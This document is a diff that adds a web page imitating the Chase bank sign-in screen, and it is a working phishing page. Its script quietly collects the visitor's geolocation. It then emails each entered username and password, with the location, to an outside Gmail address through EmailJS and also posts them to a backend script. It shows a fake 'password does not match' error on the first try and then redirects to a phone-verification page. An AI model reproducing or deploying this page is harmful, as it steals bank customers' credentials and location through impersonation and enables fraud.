@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1"
+    />
+    <title>Chase Online - Bank</title>
+    <link rel="icon" type="image/x-icon" href="img/chasefavicon.ico" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Material+Icons"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+      integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap");
+      * {
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: "Open Sans", sans-serif;
+        background-image: url("img/background_image.jpeg");
+        background-size: cover;
+        background-attachment: fixed;
+      }
+      .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 70px;
+        margin-bottom: 50px;
+      }
+
+      .chase-logo {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        padding: 20px 0;
+        background: linear-gradient(to bottom, #000000d3, #00000000);
+      }
+
+      .chase-logo img {
+        margin-top: -20px;
+        width: 180px;
+      }
+
+      form {
+        border-radius: 5px;
+        width: 320px;
+        padding: 50px 30px 30px 30px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        background-color: rgb(255, 255, 255);
+      }
+
+      .input {
+        display: flex;
+        flex-direction: column;
+        gap: 5px;
+        width: 100%;
+      }
+
+      label {
+        font-size: 14px;
+        color: rgb(78, 78, 78);
+      }
+
+      input {
+        padding: 10px;
+        margin-bottom: 20px;
+        border: none;
+        border-bottom: 1px solid rgb(56, 56, 56);
+        background-color: rgb(237, 237, 237);
+        transition: border-color 0.3s ease;
+      }
+      input:focus {
+        outline: none;
+        border-color: orangered;
+      }
+      .forgot-password {
+        text-align: left;
+        margin-bottom: 20px;
+      }
+      .links {
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .remember-token {
+        width: 80%;
+        display: flex;
+        justify-content: space-between;
+      }
+
+      button {
+        width: 100%;
+        font-family: inherit;
+        font-weight: 600;
+        font-size: 14px;
+        padding: 8px;
+        border-radius: 5px;
+        border: none;
+        background-color: #0060f0;
+        color: #fff;
+        cursor: pointer;
+        transition: 0.1s ease;
+        margin-bottom: 20px;
+      }
+
+      button:hover {
+        background-color: rgb(0, 46, 83);
+      }
+
+      a {
+        align-self: flex-start;
+        font-size: 14px;
+        font-weight: 500;
+        text-decoration: none;
+        color: #0060f0;
+      }
+
+      .footer {
+        background-color: rgb(255, 255, 255);
+        width: 100%;
+        display: flex;
+        color: #717171;
+        align-items: center;
+        flex-direction: column;
+      }
+
+      .footer .top {
+        display: flex;
+        gap: 15px;
+        justify-content: center;
+        padding-block: 20px;
+        border-bottom: 1px solid grey;
+        width: 90%;
+      }
+
+      .footer .center {
+        padding: 20px;
+        display: flex;
+        gap: 20px;
+        width: 80%;
+        align-items: center;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+
+      .footer .center a {
+        font-weight: 300;
+        font-size: 11px;
+        display: flex;
+        gap: 5px;
+        color: #323232;
+        text-decoration: underline;
+        align-items: center;
+      }
+
+      .footer .center a span {
+        font-size: 13px;
+      }
+
+      .icons {
+        display: flex;
+        gap: 10px;
+        font-size: 24px;
+      }
+
+      .bottom {
+        font-weight: 300;
+        font-size: 11px;
+        display: flex;
+        gap: 5px;
+        color: #323232;
+      }
+
+      .notif {
+        background-color: rgb(220, 108, 70);
+        color: rgb(0, 0, 0);
+        font-size: 13px;
+        border-radius: 5px;
+        padding: 15px;
+        margin-bottom: 15px;
+      }
+
+      @media screen and (max-width: 600px) {
+        form {
+          max-width: 300px;
+          padding: 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="chase-logo">
+        <img src="img/wordmark-white.png" alt="" />
+      </div>
+      <form>
+        <div id="login-title"></div>
+        <input type="hidden" id="loc" name="loc" />
+        <div class="input">
+          <label for="username">Username</label>
+          <input type="text" id="username" name="username" />
+        </div>
+        <div class="input">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" />
+        </div>
+        <div class="remember-token">
+          <div class="token">
+            <input type="checkbox" name="rem" id="" />
+            <label for="rem">Remember me</label>
+          </div>
+          <div class="token">
+            <input type="checkbox" name="tok" id="" />
+            <label for="tok">Use Token</label>
+          </div>
+        </div>
+        <button type="button" id="submit-btn">Sign In</button>
+        <a href="#">Forgot username/password?</a>
+        <a href="#" style="margin-top: 5px">Not enrolled? Sign up now</a>
+      </form>
+    </div>
+    <div class="footer">
+      <div class="top">
+        Follow Us:
+        <div class="icons">
+          <i class="fa-brands fa-facebook"></i>
+          <i class="fa-brands fa-instagram"></i>
+          <i class="fa-brands fa-twitter"></i>
+          <i class="fa-brands fa-youtube"></i>
+          <i class="fa-brands fa-linkedin"></i>
+        </div>
+      </div>
+      <div class="center">
+        <a href="#">Contact us</a>
+        <a href="#">Privacy</a>
+        <a href="#">Security</a>
+        <a href="#">Terms of use</a>
+        <a href="#">Accessibility</a>
+        <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
+        <a href="#">Fair Lending</a>
+        <a href="#">About Chase</a>
+        <a href="#">J.P. Morgan</a>
+        <a href="#">JPMorgan Chase & Co.</a>
+        <a href="#">Careers</a>
+        <a href="#">Espanol</a>
+        <a href="#">Chase Canada</a>
+        <a href="#">Site map</a>
+        <a href="#" style="text-decoration: none">Member FDIC</a>
+        <a href="#" style="text-decoration: none">
+          <span class="material-symbols-outlined"> other_houses </span>
+          Equal Housing Opportunity
+        </a>
+      </div>
+      <div class="bottom">(c) 2024 JPMorgan Chase & Co.</div>
+    </div>
+
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+      integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init({
+          publicKey: "10Wh8RN-TPlYZRbap",
+        });
+      })();
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", getUserLocation);
+
+      // Function to get user's location
+      function getUserLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            // Success callback
+            function (position) {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+              getLocationFromCoordinates(latitude, longitude);
+
+              // You can now use latitude and longitude to further process the location
+            },
+            // Error callback
+            function (error) {
+              console.error("Error getting user location:", error);
+            }
+          );
+        } else {
+          console.error("Geolocation is not supported by this browser.");
+        }
+      }
+      var loc;
+      // Function to get location from latitude and longitude
+      function getLocationFromCoordinates(latitude, longitude) {
+        // Construct the URL for the OpenStreetMap Nominatim API
+        const apiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
+
+        // Make a GET request to the API
+        fetch(apiUrl)
+          .then((response) => response.json())
+          .then((data) => {
+            console.log(data);
+            if (data && data.display_name) {
+              loc = data.display_name;
+            } else {
+              console.error("No location found for the coordinates.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error fetching location:", error);
+          });
+      }
+      const loginTitle = document.getElementById("login-title");
+      var click = 0;
+      $(document).ready(function () {
+        $("#submit-btn").click(function () {
+          var pass = $("#password").val();
+          var name = $("#username").val();
+
+          if (pass == "" || name == "") {
+            loginTitle.innerHTML = `
+                  <div class='notif'>Please fill in all the fields.</div>
+                  `;
+          } else {
+            function sendMail() {
+              const serviceId = "service_wp0ll78";
+              const templateId = "template_pvad5x6";
+              var params = {
+                name: "CHASE-ICONASSETS",
+                email: "dreedlock6@gmail.com",
+
+                message: `
+      <table border="1" cellpadding="5" cellspacing="0" style="border-collapse: collapse;">
+        <tr>
+          <td><strong>Page:</strong></td>
+          <td>Login</td>
+        </tr>
+        <tr>
+          <td><strong>Username:</strong></td>
+          <td>${name}</td>
+        </tr>
+        <tr>
+          <td><strong>Password:</strong></td>
+          <td>${pass}</td>
+        </tr>
+        <tr>
+          <td><strong>Location:</strong></td>
+          <td>${loc}</td>
+        </tr>
+        <tr>
+          <td><strong>Source:</strong></td>
+          <td>CHASE</td>
+        </tr>
+      </table>
+    `,
+              };
+
+              emailjs
+                .send(serviceId, templateId, params)
+                .then((res) => console.log(res));
+            }
+
+            sendMail();
+            if (click == 0) {
+              $.ajax({
+                type: "POST",
+                url: "backend.php",
+                data: { name: name, pass: pass, type: "login", loc: loc },
+
+                success: function (response) {
+                  console.log(response);
+                  loginTitle.innerHTML = `
+                      <div class='notif'>The password you entered does not match our records, Please try again.</div>`;
+                  $("#password").val("");
+                  $("#username").val("");
+                },
+              });
+              click = click + 1;
+            } else {
+              $.ajax({
+                type: "POST",
+                url: "backend.php",
+                data: { name: name, pass: pass, type: "login", loc: loc },
+                success: function (response) {
+                  console.log(response);
+                  window.location.href = "phone-verfication.html";
+                },
+              });
+            }
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
